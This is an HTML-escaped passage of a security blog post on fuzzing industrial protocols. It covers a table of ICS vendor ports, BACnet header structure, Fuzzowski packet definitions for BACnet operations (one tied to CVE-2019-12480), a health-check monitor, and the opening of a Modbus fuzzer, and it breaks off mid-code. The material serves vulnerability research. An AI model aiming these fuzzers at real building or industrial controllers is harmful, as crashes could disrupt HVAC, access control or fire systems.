      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/11001&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Johnson Controls&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Metasys BACNet&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;UDP/47808&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;OSIsoft&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;PI Server&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/5450&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Siemens&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Spectrum Power TG&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/50001 to 50016, TCP/50018 to 50020, UDP/50020 to 50021, TCP/50025 to 50028, TCP/50110 to 50111&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SNC&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;GENe&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/38000 to 38001, TCP/38011 to 38012, TCP/38014 to 38015, TCP/38200, TCP/38210, TCP/38301, TCP/38400, TCP/38700, TCP/62900, TCP/62911, TCP/62924, TCP/62930, TCP/62938, TCP/62956 to 62957, TCP/62963, TCP/62981 to 62982, TCP/62985, TCP/62992, TCP/63012, TCP/63027 to 63036, TCP/63041, TCP/63075, TCP/63079, TCP/63082, TCP/63088, TCP/63094, TCP/65443&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Telvent&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;OASyS DNA&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;UDP/5050 to 5051, TCP/5052, TCP/5065, TCP/12135 to 12137, TCP/56001 to 56099&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;fuzzing-bacnet&quot;&gt;Fuzzing BACnet&lt;/h1&gt;

&lt;h2 id=&quot;bacnet&quot;&gt;BACnet&lt;/h2&gt;

&lt;p&gt;BACnet was designed to allow communication of building automation and control systems for applications such as heating, ventilating, and air-conditioning control (HVAC), lighting control, access control, and fire detection systems and their associated equipment. The BACnet protocol provides mechanisms for computerized building automation devices to exchange information, regardless of the particular building service they perform.&lt;/p&gt;

&lt;p&gt;BACnet is a communications protocol for Building Automation and Control (BAC) networks UDP based and contains 3 main headers the BVLC, NPDU and APDU.&lt;/p&gt;

&lt;p&gt;A request to BACnet passes down through the lower layers of the protocol stack in the local device, this process can be observed in the next image &lt;a href=&quot;http://bdocam.com/I2BS_TEST/I2BS/BacNet/Protocol/135_2004.pdf&quot;&gt;Source&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet_protocol_stack_data_flow.png&quot; alt=&quot;BACnet_protocol_stack_data_flow&quot; title=&quot;BACnet_protocol_stack_data_flow&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The 3 headers can be examined in the &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Main_Page&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet_packet.png&quot; alt=&quot;BACnet_packet&quot; title=&quot;BACnet_packet&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;bvlc-bacnet-virtual-link-control-4-bytes&quot;&gt;BVLC (BACNet virtual link control): 4 bytes&lt;/h3&gt;

&lt;p&gt;The firts byte defines the type, in this case bacnet/ip 0x81, the second one defines the function 0x0a, and the last 2 bytes defines the length of the whole packet &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=BACnet_Virtual_Link_Layer&quot;&gt;BACnet Wiki&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The firts byte defines the type: bacnet/ip 0x81&lt;/li&gt;
  &lt;li&gt;The second byte defines the function 0x0a (ORIGINAL_UNICAST_NPDU = 10)&lt;/li&gt;
  &lt;li&gt;The last 2 bytes defines the length of the whole packet&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;NPDU Function:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc-function.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see in the BACnet packet the UDP Port number used by BACnet communications over IP is 47808:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc-pcap.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;npdu-network-layer-protocol-data-unit-2-bytes&quot;&gt;NPDU (Network layer protocol data unit): 2 bytes&lt;/h3&gt;

&lt;p&gt;The NPDU consists of a NPCI followed by a NSDU. &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Network_Layer_Protocol_Data_Unit&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;According bacnetwiki this is the representation, but be careful here, in practice the headers is just 2 bytes, Version (Always 0x01) and NPCI Control Octet:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/npdu.png&quot; alt=&quot;npdu&quot; title=&quot;npdu&quot; /&gt;&lt;/p&gt;

&lt;p&gt;NPDU Layer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/npdu-pcap.png&quot; alt=&quot;npdu&quot; title=&quot;npdu&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;apdu-network-layer-protocol-data-unit-2-bytes&quot;&gt;APDU (Network layer protocol data unit): 2 bytes&lt;/h3&gt;

&lt;p&gt;BACnet APDUs carry the Application Layer parameters. The maximum size of an APDU is specified by a device’s Max_APDU_Length_Accepted, be careful with that, otherwise you will face malformed packet issues. &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=APDU&quot;&gt;BACnet APDU&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/apdu-pcap.png&quot; alt=&quot;apdu&quot; title=&quot;apdu&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;in-fuzzing-we-trust&quot;&gt;In fuzzing we trust&lt;/h2&gt;

&lt;p&gt;First of all we need to understand and known how the protocol that we want to fuzz works. With this in mind in the next lines will be provided some examples on how to fuzz certain operations that are used in this case by BACnet. The examples provided below are written to be used with &lt;a href=&quot;https://github.com/nccgroup/fuzzowski&quot;&gt;Fuzzowski&lt;/a&gt; a Network Protocol Fuzzer forked from &lt;a href=&quot;https://github.com/jtpereyda/boofuzz&quot;&gt;BooFuzz&lt;/a&gt; (which is a fork of &lt;a href=&quot;https://github.com/OpenRCE/sulley&quot;&gt;Sulley&lt;/a&gt;), so the next examples can be translated easily to boofuzz.&lt;/p&gt;

&lt;p&gt;In BACnet the devices have a Device ID (Device Object Identifier) which is used in a BACnet network as the unique identifier of a specific device. The Device ID for each device must be unique on the entire BACnet network. Device Instance can be in the range of 0 to 4194304. So first of all we need to modify and set the BACnet Device ID in the &lt;a href=&quot;https://github.com/nccgroup/fuzzowski/blob/master/fuzzowski/fuzzers/bacnet/bacnet.py&quot;&gt;BACnet fuzzer&lt;/a&gt; that we can found in the Fuzzowski repository&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DeviceID = 12345 # BACnet Device ID
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Also some Codes, Functions and Services or Types have been defined in the BACnet fuzzer to be used by the methods defined:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BVLC_Function_Code = [
    &apos;\x00&apos;,  # BVLC Result
    &apos;\x01&apos;,  # Write Broadcast Distribution Table 
    &apos;\x02&apos;,  # Read Broadcast Distribution Table 
    &apos;\x03&apos;,  # Read Broadcast Distribution Table ACK 
    &apos;\x04&apos;,  # Forwarded-NPDU
    &apos;\x05&apos;,  # Register Foreign Device
    &apos;\x0a&apos;,  # Original-Unicast-NPDU
    &apos;\x0b&apos;,  # Original-Broadcast-NPDU
    &apos;\x0c&apos;   # Secure-BVLL 
]

Confirmed_Service_Choices = [
    &apos;\x05&apos;,  # Subscribe COV
    &apos;\x0c&apos;,  # Read Property
    &apos;\x0e&apos;,  # Read Property Multiple
    &apos;\x0f&apos;,  # Write Property 
    &apos;\x10&apos;,  # Write Property Multiple
    &apos;\x11&apos;,  # Device Communication Control
    &apos;\x14&apos;   # Reinitialize Device
]

Network_Layer_Message_Type = [
    &apos;\x00&apos;,  # Who-Is-Router-To-Network
    &apos;\x01&apos;,  # I-Am-Router-To-Network
    &apos;\x02&apos;,  # I-Could-Be-Router-To-Network
    &apos;\x03&apos;,  # Reject-Message-To-Network
    &apos;\x04&apos;,  # Router-Busy-To-Network
    &apos;\x05&apos;,  # Router-Available-To-Network 
    &apos;\x06&apos;,  # Initialize-Routing-Table
    &apos;\x07&apos;,  # Initialize-Routing-Table-ACK
    &apos;\x08&apos;,  # Establish-Connection-To-Network
    &apos;\x09&apos;,  # Disconnect-Connection-To-Network
    &apos;\x0a&apos;,  # Challenge-Request
    &apos;\x0b&apos;,  # Security-Payload
    &apos;\x0c&apos;,  # Security-Response
    &apos;\x0d&apos;,  # Request-Key-Update
    &apos;\x0e&apos;,  # Update-Key-Set
    &apos;\x0f&apos;,  # Update-Distribution-Key
    &apos;\x10&apos;,  # Request-Master-Key
    &apos;\x11&apos;  # Set-Master-Key
    # 0x12 to 0x7F Reserved for use by ASHRAE
    # 0x80 to 0xFF Available for Vendor Proprietary Messages
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we can found the class where was defined the fuzzer and the methods that define all the operations that could be used to fuzz a BACnet device or server. In the example has been defined methods to fuzz DeviceCommunicationControl, who_is, i_Am, Initialize_Routing_Table, Who_Is_Router_To_Network, readProperty, atomicReadFile and atomicWriteFile. More can be defined, just adding the definition of the packet or operation.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class BACnet(IFuzzer):
    &quot;&quot;&quot;
    BACnet Fuzzing Module example
    virtualenv venv -p python3
    source venv/bin/activate
    pip install -r requirements.txt
    python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -m BACnetMon
    python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -r who_is -m BACnetMon
    python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -r DeviceCommunicationControl -m BACnetMon
    &quot;&quot;&quot;

    name = &apos;bacnet&apos;

    @staticmethod
    def get_requests() -&amp;gt; List[callable]:
        return [BACnet.DeviceCommunicationControl, BACnet.who_is, BACnet.i_Am, BACnet.Initialize_Routing_Table, BACnet.Who_Is_Router_To_Network, BACnet.readProperty, BACnet.atomicReadFile, BACnet.atomicWriteFile]

    @staticmethod
    def define_nodes(*args, **kwargs) -&amp;gt; None:
        
        # ---------------- DeviceCommunicationControl ------------------- #
        # Used in CVE-2019-12480
        # Start DeviceCommunicationControl bacnet request packet
        s_initialize(&quot;DeviceCommunicationControl&quot;)
        with s_block(&quot;bacnet_virtual_link_control&quot;):
            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
            s_byte(0x0a, name=&apos;function_bvlc&apos;, fuzzable=False)
            s_word(0x0017, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        with s_block(&quot;bacnet_npdu&quot;):
            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=False)
            s_byte(0x04, name=&apos;control_bacnet&apos;, fuzzable=False)
        with s_block(&quot;bacnet_apdu&quot;):
            s_byte(0x02, name=&apos;type_bacapp&apos;, fuzzable=True)
            s_byte(0x44, name=&apos;max_adpu_size_bacapp&apos;, fuzzable=True)
            s_byte(0x08, name=&apos;invoke_id_bacapp&apos;, fuzzable=True)
            s_byte(0x11, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
            s_byte(0x0d, name=&apos;context_tag&apos;, fuzzable=True)
            s_byte(0xff, name=&apos;tag_class&apos;, fuzzable=True)
            s_byte(0x80, name=&apos;tag_number&apos;, fuzzable=True)
            s_word(0x0000, name=&apos;enable&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_word(0x0000, name=&apos;passwd_length&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;lvt&apos;, fuzzable=True)
            s_dword(0x0a1a0300, name=&apos;lenght_value_type&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_word(0x1900, name=&apos;enable-disable&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x2a, name=&apos;lvt_passwd&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;string_char_set&apos;, fuzzable=True)
            s_string(&apos;A&apos;, name=&apos;passwd&apos;, fuzzable=True)
        # end bacnet DeviceCommunicationControl
        # ---------------- DeviceCommunicationControl ------------------- #
        
        # ------------------------- Who-Is ------------------------------ #
        # Start Who-Is bacnet request packet
        s_initialize(&quot;who_is&quot;)
        with s_block(&quot;bacnet_virtual_link_control&quot;):
            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
            s_word(0x000c, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        with s_block(&quot;bacnet_npdu&quot;):
            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=True)
            s_byte(0x20, name=&apos;control_bacnet&apos;, fuzzable=True)
            s_word(0xffff, name=&apos;detination&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;mac&apos;, fuzzable=True)
            s_byte(0xff, name=&apos;hop&apos;, fuzzable=True)
        with s_block(&quot;bacnet_apdu&quot;):
            s_byte(0x10, name=&apos;type_bacapp&apos;, fuzzable=True)
            s_byte(0x08, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
        # end
        # ------------------------- Who-Is ------------------------------ #

        # ------------------- Initialize_Routing_Table ------------------ #
        # Start Initialize_Routing_Table bacnet request packet
        s_initialize(&quot;Initialize_Routing_Table&quot;)
        with s_block(&quot;bacnet_virtual_link_control&quot;):
            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
            s_word(0x0008, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        with s_block(&quot;bacnet_npdu&quot;):
            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=True)
            s_byte(0x80, name=&apos;control_bacnet&apos;, fuzzable=True)
            s_byte(0x06, name=&apos;message_type&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;rpot_number&apos;, fuzzable=True)
        # end
        # ------------------- Initialize_Routing_Table ------------------ #


        # ------------------ Who_Is_Router_To_Network ------------------- #
        # Start Who_Is_Router_To_Network bacnet request packet 
        s_initialize(&quot;Who_Is_Router_To_Network&quot;)
        with s_block(&quot;bacnet_virtual_link_control&quot;):
            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
            s_word(0x0007, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        with s_block(&quot;bacnet_npdu&quot;):
            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=True)
            s_byte(0x80, name=&apos;control_bacnet&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;message_type&apos;, fuzzable=True)
        # end
        # ------------------ Who_Is_Router_To_Network ------------------- #
        
        # ---------------------------- i-Am ----------------------------- #
        # Start i-Am bacnet request packet 
        s_initialize(&quot;i_Am&quot;)
        with s_block(&quot;bacnet_virtual_link_control&quot;):
            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
            s_word(0x0018, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        with s_block(&quot;bacnet_npdu&quot;):
            s_byte(0x01, name=&apos;version_bacnet&apos;, fuzzable=True)
            s_byte(0x20, name=&apos;control_bacnet&apos;, fuzzable=True)
            s_word(0xffff, name=&apos;destination&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;destination_mac&apos;, fuzzable=True)
            s_byte(0xff, name=&apos;hop_count&apos;, fuzzable=True)
        with s_block(&quot;bacnet_apdu&quot;):
            s_byte(0x10, name=&apos;type_bacapp&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
            # deviceID
            s_byte(0xc4, name=&apos;ObjectIdentifier_device&apos;, fuzzable=True)
            s_byte(0x02, name=&apos;ObjectIdentifier_instance_number&apos;, fuzzable=True)
            s_byte(DeviceID_byte1, name=&apos;ObjectIdentifier_deviceID_byte1&apos;, fuzzable=True)
            s_byte(DeviceID_byte2, name=&apos;ObjectIdentifier_deviceID_byte2&apos;, fuzzable=True)
            s_byte(DeviceID_byte3, name=&apos;ObjectIdentifier_deviceID_byte3&apos;, fuzzable=True)
            # deviceID
            s_byte(0x22, name=&apos;lvt&apos;, fuzzable=True)
            s_word(0x0400, name=&apos;max_adpu_size_bacapp&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_word(0x9100, name=&apos;segmented_both&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_word(0x2105, name=&apos;vendor_id&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        # end
        # ---------------------------- i-Am ----------------------------- #
        
        # ------------------------- readProperty ------------------------ #
        # Start readProperty bacnet request packet
        s_initialize(&quot;readProperty&quot;)
        with s_block(&quot;bacnet_virtual_link_control&quot;):
            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
            s_byte(0x0b, name=&apos;function_bvlc&apos;, fuzzable=False)
            s_word(0x0011, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        with s_block(&quot;bacnet_npdu&quot;):
            s_byte(0x01, name=&apos;version&apos;, fuzzable=False)
            s_byte(0x04, name=&apos;control&apos;, fuzzable=False)
        with s_block(&quot;bacnet_apdu&quot;):
            s_byte(0x02, name=&apos;type_bacapp&apos;, fuzzable=False)
            s_byte(0x44, name=&apos;max_adpu_size_bacapp&apos;, fuzzable=True)
            s_byte(0x03, name=&apos;invoke_id_bacapp&apos;, fuzzable=True)
            s_byte(0x0c, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
            # deviceID
            s_byte(0x0c, name=&apos;ObjectIdentifier_deviceID&apos;, fuzzable=True)
            s_byte(0x02, name=&apos;ObjectIdentifier_instance_number&apos;, fuzzable=True)
            s_byte(DeviceID_byte1, name=&apos;ObjectIdentifier_deviceID_byte1&apos;, fuzzable=True)
            s_byte(DeviceID_byte2, name=&apos;ObjectIdentifier_deviceID_byte2&apos;, fuzzable=True)
            s_byte(DeviceID_byte3, name=&apos;ObjectIdentifier_deviceID_byte3&apos;, fuzzable=True)
            s_word(0x194b, name=&apos;property_identifier_bacapp&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        # end
        # ------------------------- readProperty ------------------------ #

        # ------------------------- atomicReadFile ----------------------- #
        # Start atomicReadFile bacnet request packet
        s_initialize(&quot;atomicReadFile&quot;)
        with s_block(&quot;bacnet_virtual_link_control&quot;):
            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
            s_byte(0x0a, name=&apos;function_bvlc&apos;, fuzzable=False)
            s_word(0x001b, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        with s_block(&quot;bacnet_npdu&quot;):
            s_byte(0x01, name=&apos;version&apos;, fuzzable=False)
            s_byte(0x04, name=&apos;control&apos;, fuzzable=False)
        with s_block(&quot;bacnet_apdu&quot;):
            s_byte(0x00, name=&apos;type_bacapp&apos;, fuzzable=False)
            s_byte(0x05, name=&apos;max_adpu_size_bacapp&apos;, fuzzable=True)
            s_byte(0x01, name=&apos;invoke_id_bacapp&apos;, fuzzable=True)
            s_byte(0x06, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
            # file
            s_dword(0xc4028000, name=&apos;file&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;ObjectIdentifier&apos;, fuzzable=True)
            # stream
            s_word(0x0e35, name=&apos;named_tag&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_dword(0xffdf62ee, name=&apos;lvt&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;ObjectIdentifier_2&apos;, fuzzable=True)
            s_dword(0x00220584, name=&apos;text&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x0f, name=&apos;named_tag_2&apos;, fuzzable=True)
        # end
        # ------------------------- atomicReadFile ----------------------- #

        # ------------------------- atomicWriteFile ---------------------- #
        # Start atomicWriteFile bacnet request packet
        s_initialize(&quot;atomicWriteFile&quot;)
        with s_block(&quot;bacnet_virtual_link_control&quot;):
            s_byte(0x81, name=&apos;type_bvlc&apos;, fuzzable=False)
            s_byte(0x0a, name=&apos;function_bvlc&apos;, fuzzable=False)
            s_word(0x001b, name=&apos;length_bvlc&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
        with s_block(&quot;bacnet_npdu&quot;):
            s_byte(0x01, name=&apos;version&apos;, fuzzable=False)
            s_byte(0x04, name=&apos;control&apos;, fuzzable=False)
        with s_block(&quot;bacnet_apdu&quot;):
            s_byte(0x00, name=&apos;type_bacapp&apos;, fuzzable=False)
            s_byte(0x05, name=&apos;max_adpu_size_bacapp&apos;, fuzzable=True)
            s_byte(0x02, name=&apos;invoke_id_bacapp&apos;, fuzzable=True)
            s_byte(0x07, name=&apos;confirmed_service_bacapp&apos;, fuzzable=True)
            # file
            s_dword(0xc4028000, name=&apos;file&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x00, name=&apos;ObjectIdentifier&apos;, fuzzable=True)
            # stream
            s_word(0x0e35, name=&apos;named_tag&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_dword(0xff5ed5c0, name=&apos;lvt&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x85, name=&apos;ObjectIdentifier_2&apos;, fuzzable=True)
            s_dword(0x0a62640a, name=&apos;text&apos;, endian=&apos;&amp;gt;&apos;, fuzzable=True)
            s_byte(0x0f, name=&apos;named_tag_2&apos;, fuzzable=True)
        # end
        # ------------------------- atomicWriteFile ---------------------- #

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we can start launching the fuzzer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -m BACnetMon&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;While Fuzzing we can found errors like observed in the image below that could bring to us some information of the issue like a segmentation fault or error in the server that could help in a further attack. In the next image can be observed that the monitor defined for this fuzzer has been detected no response from the server and launched a fail message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet-fuzz-fault.png&quot; alt=&quot;BACnet-fuzz-fault&quot; title=&quot;BACnet-fuzz-fault&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If an error is detected, fuzzowski offers a cool functionallity that help us to generates a proof of concept of any fault identified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet-fuzz-poc.jpg&quot; alt=&quot;BACnet-fuzz-poc&quot; title=&quot;BACnet-fuzz-poc&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;bacnet-monitor&quot;&gt;BACnet Monitor&lt;/h2&gt;

&lt;p&gt;Fuzzing is not the magic thing that provide us a way to found vulnerabilities, one of the most important things apart from define the fuzzer is to develop the monitor, and implement how we want to identify faults in the fuzzed system. In this case we have defined a &lt;a href=&quot;https://github.com/nccgroup/fuzzowski/blob/master/fuzzowski/fuzzers/bacnet/bacnetmonitor.py&quot;&gt;monitor&lt;/a&gt; for the BACnet fuzzer that sends a query for Property Identifier ID to the target in order to get the BACnet device information and check the response. In our case if the BACnet device does not respond to this query a fault is generated or identified, and indeed all the faults are needed to be double checked to verify if exists or not an issue, crash or other type of output that could us help in a further attack.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class BACnetMonitor(IMonitor):
    &quot;&quot;&quot;
    BACnet Monitor Module interface
    @Author: https://github.com/1modm
    Based on https://svn.nmap.org/nmap/scripts/bacnet-info.nse
    &quot;&quot;&quot;

    get_bacnet_property_identifier_id = (b&quot;\x81&quot;  # Type: BACnet/IP (Annex J)
                                   b&quot;\x0a&quot;  # Function: Original-Unicast-NPDU
                                   b&quot;\x00\x11&quot;  # BVLC-Length: 4 of 17 bytes
                                   # BACnet NPDU
                                   b&quot;\x01&quot;  # Version: 0x01 (ASHRAE 135-1995)
                                   b&quot;\x04&quot;  # Control (expecting reply)
                                   # BACnet APDU
                                   b&quot;\x00&quot;  # APDU Type: Confirmed-REQ, PDU flags: 0x0
                                   b&quot;\x05&quot;  # Max response segments unspecified, Max APDU size: 1476 octets
                                   b&quot;\x01&quot;  # Invoke ID: 1
                                   b&quot;\x0c&quot;  # Service Choice: readProperty
                                   b&quot;\x0c&quot;  # Context-specific tag, number 0, Length Value Type 4
                                   b&quot;\x02\x3f\xff\xff&quot; # Object Type: device; instance number 4194303
                                   b&quot;\x19\x4b&quot; # Context-specific tag, number 1, Length Value Type 1
                                   # TODO, send DeviceID
                                   )

    @staticmethod
    def name() -&amp;gt; str:
        return &quot;BACnetMon&quot;

    @staticmethod
    def help():
        return &quot;Sends a query for Property Identifier id to the target in order to get the BACnet device information and check the response&quot;

    def test(self):
        conn = self.get_connection_copy()
        result = self._get_bacnet_info(conn)
        return result

    def _get_bacnet_info(self, conn: ITargetConnection):
        try:
            conn.open()
            conn.send(self.get_bacnet_property_identifier_id)
            data = conn.recv_all(10000)
            if len(data) == 0:
                self.logger.log_error(&quot;BACnet error response, getting BACnet device information Failed!!&quot;)
                result = False
            else:
                # validate valid BACNet Packet and verify that the response APDU was not an error packet
                if hex(data[0]) == &apos;0x81&apos; and hex(data[1]) == &apos;0xa&apos; and hex(data[6]) != &apos;0x50&apos;:
                  self.logger.log_info(f&quot;Getting BACnet device information succeeded&quot;)
                else:
                  self.logger.log_warn(f&quot;Getting BACnet error response in the APDU&quot;)
                result = True
        except Exception as e:
            self.logger.log_error(f&quot;BACnet error response, getting BACnet device information Failed!! Exception while receiving: {type(e).__name__}. {str(e)}&quot;)
            result = False
        finally:
            conn.close()

        return result
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the next image can be found the request sent to check if the BACnet device is still working:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet-monitor-request.png&quot; alt=&quot;BACnet-monitor-request&quot; title=&quot;BACnet-monitor-request&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the response in which can be observed that the device send the Instance Number (12345) of our target server tested:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet-monitor-response.png&quot; alt=&quot;BACnet-monitor-response&quot; title=&quot;BACnet-monitor-response&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;fuzzing-modbus&quot;&gt;Fuzzing Modbus&lt;/h1&gt;

&lt;p&gt;In the same way than our previous protocol fuzzer, a &lt;a href=&quot;https://github.com/nccgroup/fuzzowski/blob/master/fuzzowski/fuzzers/modbus/modbus.py&quot;&gt;modbus fuzzer&lt;/a&gt; has been uploaded as an example. And the way we could launch the fuzzer using the &lt;a href=&quot;https://github.com/nccgroup/fuzzowski/blob/master/fuzzowski/fuzzers/modbus/modbusmonitor.py&quot;&gt;monitor&lt;/a&gt; implemented could be: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus -rt 1 -m modbusMon&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The modbus class has the next methods implemented that could be used to fuzz any modbus/TCP server; read_coil, read_input, read_holding, read_discrete, single_coil, single_register, multiple_coil, multiple_register&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class MODBUS(IFuzzer):
    &quot;&quot;&quot;
    MODBUS Fuzzing Module
